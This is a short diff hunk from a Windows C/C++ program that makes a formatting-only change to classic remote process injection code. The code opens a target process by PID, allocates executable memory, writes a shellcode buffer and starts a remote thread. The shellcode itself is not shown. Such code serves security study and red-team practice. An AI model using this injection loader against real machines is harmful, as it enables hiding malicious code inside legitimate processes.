@@ -13,8 +13,7 @@ int main(int argc, char** argv)
   // Try with C:\Windows\system32\notepad.exe or C:\Windows\SysWOW64\notepad.exe
   printf("Injecting to PID: %i", atoi(argv[1]));
   auto hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
-  auto remoteBuffer =
-      VirtualAllocEx(hProcess, NULL, sizeof(shellcode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+  auto remoteBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
   WriteProcessMemory(hProcess, remoteBuffer, shellcode, sizeof(shellcode), NULL);
   auto remoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
   CloseHandle(hProcess);
